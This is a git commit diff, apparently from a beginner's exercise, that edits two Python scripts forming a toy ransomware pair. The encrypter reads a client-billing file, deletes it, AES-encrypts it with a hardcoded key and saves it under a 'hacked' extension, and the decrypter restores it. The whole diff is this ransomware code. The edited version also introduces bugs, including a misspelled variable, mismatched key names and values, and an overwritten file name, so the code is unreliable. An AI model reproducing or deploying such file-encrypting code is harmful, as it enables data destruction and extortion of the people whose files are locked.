4286576e4ce4c128b0078fc1b326aa8552f0e062
AlekFerrari <119500334+AlekFerrari@users.noreply.github.com>
2025-01-19 22:09:14 -0300

    Codigos e arquivos finalizados
    Ainda com problema no codigo com import Pyaes.

--- decrypter.py
+++ decrypter.py
@@ -1,22 +1,27 @@
 import os
 import pyaes
 
-## abrir o arquivo criptografado
-file_name = "teste.txt.ransomwaretroll"
-file = open(file_name, "rb")
+##Abrir o arquivo cryptografado
+
+file_name = 'clientes_cobranca.txt.ransomwaretroll'
+file = open(file_name, 'rb')
 file_data = file.read()
 file.close()
 
-## chave para descriptografia
-key = b"testeransomwares"
+##Chave de descriptografia
+
+Key = b'testeansomwares'
 aes = pyaes.AESModeOfOperationCTR(key)
 decrypt_data = aes.decrypt(file_data)
 
-## remover o arquivo criptografado
+##Remove arquivo criptografado
+
 os.remove(file_name)
 
-## criar o arquivo descriptografado
-new_file = "teste.txt"
-new_file = open(f'{new_file}', "wb")
+##Criar um novo arquivo descripografado
+
+new_file = 'clientes_cobranca.txt'
+new_file = open(f'{new_file}','wb')
 new_file.write(decrypt_data)
 new_file.close()
+
--- encrypter.py
+++ encrypter.py
@@ -1,24 +1,29 @@
 import os
 import pyaes
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
+## Abrir o arquivo para ser criptografado, aqui ele abre, lê e fecha.
+
+file_name = "clientes_cobranca.txt"
 file = open(file_name, "rb")
 file_data = file.read()
 file.close()
 
-## remover o arquivo
-os.remove(file_name)
+## Remove o arquivo
 
-## chave de criptografia
+os.remove(fiel_name)
+
+## Cria a chave de criptografia
+
 key = b"testeransomwares"
 aes = pyaes.AESModeOfOperationCTR(key)
 
-## criptografar o arquivo
+## Criptografar o arquivo
+
 crypto_data = aes.encrypt(file_data)
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
+## Criar um novo arquivo com uma nova extenção para mostrar que foi hackeado.
+
+new_file = file_name = ".ransomwaretepeguei"
 new_file = open(f'{new_file}','wb')
 new_file.write(crypto_data)
 new_file.close()
